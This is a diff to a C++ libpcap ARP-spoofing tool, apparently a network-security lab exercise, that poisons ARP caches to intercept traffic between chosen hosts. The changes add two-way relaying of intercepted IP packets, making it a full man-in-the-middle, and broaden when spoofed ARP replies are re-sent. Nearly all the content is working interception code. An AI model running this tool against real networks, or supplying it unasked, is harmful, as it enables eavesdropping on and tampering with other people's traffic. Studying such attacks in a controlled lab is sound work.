@@ -7,7 +7,6 @@
 #include "arphdr.h"
 using namespace std;
 
-//reinfection value
 #define ENABLE_PERIODIC_REINFECTION 0
 #define REINFECTION_PERIOD 5
 
@@ -18,6 +17,17 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
+struct IpHdr final {
+    uint8_t vhl, tos;
+    uint16_t len, id, off;
+    uint8_t ttl, p;
+    uint16_t sum;
+    uint32_t sip_, dip_;
+
+    Ip sip() const { return Ip(ntohl(sip_)); }
+    Ip dip() const { return Ip(ntohl(dip_)); }
+};
+
 struct Connection {
     Ip sender_ip;
     Ip target_ip;
@@ -25,24 +35,12 @@ struct Connection {
     Mac target_mac;
 };
 
-struct IpHdr final {
-	uint8_t vhl, tos;
-	uint16_t len, id, off;
-	uint8_t ttl, p;
-	uint16_t sum;
-	uint32_t sip_, dip_;
-
-	Ip sip() const { return Ip(ntohl(sip_)); }
-	Ip dip() const { return Ip(ntohl(dip_)); }
-};
-
-
 void usage() {
     printf("syntax : arp-spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
     printf("sample : arp-spoofing wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-string get_attacker_mac(const string &name) {
+string get_attacker_mac(const string& name) {
     ifstream mac_file("/sys/class/net/" + name + "/address");
     if (!mac_file.is_open()) {
         perror("MAC file open error");
@@ -53,7 +51,7 @@ string get_attacker_mac(const string &name) {
     return res;
 }
 
-string get_attacker_ip(const string &name) {
+string get_attacker_ip(const string& name) {
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) {
         perror("Socket open error");
@@ -92,12 +90,7 @@ EthArpPacket make_arp_packet(const Mac& eth_smac, const Mac& eth_dmac,
 }
 
 bool send_arp_packet(pcap_t* handle, const EthArpPacket& packet) {
-    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
-    if (res != 0) {
-        fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(handle));
-        return false;
-    }
-    return true;
+    return pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) == 0;
 }
 
 Mac get_mac_by_arp(pcap_t* handle, const string& attacker_mac, const string& attacker_ip, const string& target_ip) {
@@ -153,9 +146,8 @@ void* reinfect_loop(void* arg) {
                 false
             );
             send_arp_packet(args->handle, reinfect);
-            std::cout << "[*] Periodic Reinfected: sender "
-          << conn.sender_ip << " -> target "
-          << conn.target_ip << std::endl;
+            std::cout << "[*] Periodic Reinfected: sender " << conn.sender_ip
+                      << " -> target " << conn.target_ip << std::endl;
         }
     }
     return nullptr;
@@ -189,7 +181,6 @@ int main(int argc, char* argv[]) {
         conn.sender_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, sender_ip);
         conn.target_mac = get_mac_by_arp(handle, attacker_mac, attacker_ip, target_ip);
 
-        // 초기에 감염
         EthArpPacket spoof = make_arp_packet(
             Mac(attacker_mac), conn.sender_mac,
             Mac(attacker_mac), conn.sender_mac,
@@ -201,11 +192,11 @@ int main(int argc, char* argv[]) {
         connections.push_back(conn);
     }
 
-    #if ENABLE_PERIODIC_REINFECTION
-        ReinfectArgs* args = new ReinfectArgs{handle, &connections, Mac(attacker_mac)};
-        pthread_t tid;
-        pthread_create(&tid, nullptr, reinfect_loop, args);
-    #endif
+#if ENABLE_PERIODIC_REINFECTION
+    ReinfectArgs* args = new ReinfectArgs{handle, &connections, Mac(attacker_mac)};
+    pthread_t tid;
+    pthread_create(&tid, nullptr, reinfect_loop, args);
+#endif
 
     while (true) {
         struct pcap_pkthdr* header;
@@ -215,17 +206,28 @@ int main(int argc, char* argv[]) {
         if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;
 
         EthHdr* eth = (EthHdr*)packet;
+
         if (ntohs(eth->type_) == EthHdr::Ip4) {
             IpHdr* ip = (IpHdr*)(packet + sizeof(EthHdr));
 
             for (auto& conn : connections) {
+                // sender → target
                 if (ip->sip() == conn.sender_ip && ip->dip() == conn.target_ip) {
                     u_char* relay = new u_char[header->caplen];
                     memcpy(relay, packet, header->caplen);
                     EthHdr* relay_eth = (EthHdr*)relay;
                     relay_eth->smac_ = Mac(attacker_mac);
                     relay_eth->dmac_ = conn.target_mac;
-
+                    pcap_sendpacket(handle, relay, header->caplen);
+                    delete[] relay;
+                }
+                // target → sender (역방향)
+                else if (ip->sip() == conn.target_ip && ip->dip() == conn.sender_ip) {
+                    u_char* relay = new u_char[header->caplen];
+                    memcpy(relay, packet, header->caplen);
+                    EthHdr* relay_eth = (EthHdr*)relay;
+                    relay_eth->smac_ = Mac(attacker_mac);
+                    relay_eth->dmac_ = conn.sender_mac;
                     pcap_sendpacket(handle, relay, header->caplen);
                     delete[] relay;
                 }
@@ -238,8 +240,8 @@ int main(int argc, char* argv[]) {
             Ip tip = ntohl(arp->tip_);
 
             for (auto& conn : connections) {
-                // sender가 target을 묻는 ARP Request
-                if (op == ArpHdr::Request && sip == conn.sender_ip && tip == conn.target_ip) {
+                // tip만 target_ip와 일치하면 재감염
+                if (op == ArpHdr::Request && tip == conn.target_ip) {
                     EthArpPacket reinfect = make_arp_packet(
                         Mac(attacker_mac), conn.sender_mac,
                         Mac(attacker_mac), conn.sender_mac,
@@ -247,7 +249,7 @@ int main(int argc, char* argv[]) {
                         false
                     );
                     send_arp_packet(handle, reinfect);
-                    cout << "[*] Re-infection triggered: sender " << conn.sender_ip << " -> target " << conn.target_ip << '\n';
+                    cout << "[*] Re-infection triggered: " << sip << " asking for " << tip << '\n';
                 }
             }
         }
